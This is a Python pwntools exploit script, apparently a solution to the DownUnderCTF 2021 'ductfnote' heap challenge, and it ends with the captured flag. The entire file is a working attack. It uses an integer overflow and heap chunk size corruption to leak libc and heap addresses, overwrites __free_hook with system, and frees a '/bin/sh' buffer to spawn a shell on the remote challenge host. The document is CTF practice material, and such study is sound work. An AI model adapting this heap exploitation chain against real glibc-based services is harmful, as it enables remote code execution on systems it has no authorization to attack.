#!/usr/bin/env python3

from pwn import *

exe = ELF("./ductfnote_patched")
libc = ELF("./libc-2.31.so")
ld = ELF("./ld-2.31.so")

context.binary = exe
context.terminal = ["tmux", "new-window"]


def conn():
    if args.REMOTE:
        r = remote("pwn-2021.duc.tf", 31917)
    else:
        r = process([exe.path])

    return r

def attach_gdb():
    if args.GDB:
        gdb.attach(r, gdbscript="""
source ~/.gdbinit-gef.py
b*print_menu
b*main+233
b*main+251
b*main+265
b*main+279
c
        """)

def create_note(size):
    r.sendlineafter(">> ", "1")
    r.sendlineafter("Size: ", str(size))

def show_note():
    r.sendlineafter(">> ", "2")
    r.recvline()
    r.recvline()
    end_note = b"<-------------------------------->"
    return r.recvuntil(end_note)[:-len(end_note)-1]

def edit_note(content):
    r.sendlineafter(">> ", "3")
    r.sendlineafter("\n", content)

def delete_note():
    r.sendlineafter(">> ", "4")

def main():
    global r
    r = conn()

    # set maxsize to 0xffffffff (max value on 4 bytes) -> integer overflow in create_note allows us to malloc small chunks
    create_note(127)
    edit_note(b"A"*127 + b"B"*85 + p64(0x21) + p32(0xffffffff))


    """
    " leak libc base
    """
    info("leaking libc address...")
    # will be used to leak data
    create_note(0x200)
    delete_note()

    # its size will be changed with 0x500
    create_note(127)
    delete_note()

    #Â padding to pass security checks (PREV_INUSE for next chunk)
    create_note(0x80)
    # add 2 entries in tcache bin 0x100 - will be useful for write-what-where
    for _ in range(2):
        create_note(0x80)
        edit_note(b"A"*127 + b"B"*117 + p64(0x101))
        delete_note()

    for _ in range(4):
        create_note(0x80)
    create_note(0x91) # chunk with note->size=0x91, so if we interpret this value as a chunk size which have PREV_INUSE at the right place to pass security checks

    create_note(127)
    # modify chunk size with 0x501, because it will not fit in tcache bins
    # so once free'd, the chunk will be in unsorted bin
    edit_note(b"A"*127 + b"B"*117 + p64(0x501))
    delete_note()

    create_note(0x200)
    edit_note(b"A"*127 + b"B"*117 + p64(0x291) + p32(0x1000))
    libc_base = u64(show_note()[0x28c:0x28c+8]) - 0x1ebbe0
    success(f"libc base @ {hex(libc_base)}")

    # malloc will use in priority unsorted bin instead of creating new chunks from top chunk

    """
    " leak heap base
    """
    info("leaking heap address...")
    create_note(0)

    create_note(127)
    delete_note()

    create_note(0)
    delete_note()
    # this free'd chunk now contains a heap pointer

    create_note(127)
    # 0x111 : chunk size
    # 0x1000 : note->size
    edit_note(b"A"*127 + b"B"*117 + p64(0x111) + p32(0x1000) + p32(0xdead))

    heap_base = u64(show_note()[0x114:0x114+8]) - 0x10
    success(f"heap base @ {hex(heap_base)}")


    """
    " overwrite __free_hook with system
    """
    info("overwriting __free_hook with system...")
    target = libc_base + libc.symbols["__free_hook"] - 8

    create_note(0x2c0)
    edit_note(b"A"*127 + b"B"*117 + p64(0x2d1) + p64(target) + p64(target))

    create_note(0xf0)
    create_note(0xf0) # addr of target
    attach_gdb()
    edit_note(b"JUNK" + p64(libc_base + libc.symbols["system"]))


    """
    " get a shell
    """
    create_note(127)
    edit_note(b"A"*127 + b"B"*117 + p64(0xdead) + b"/bin/sh")
    delete_note()



    r.interactive()


if __name__ == "__main__":
    main()

# DUCTF{n0w_you_4r3_r34dy_f0r_r34l_m$_0d4y}
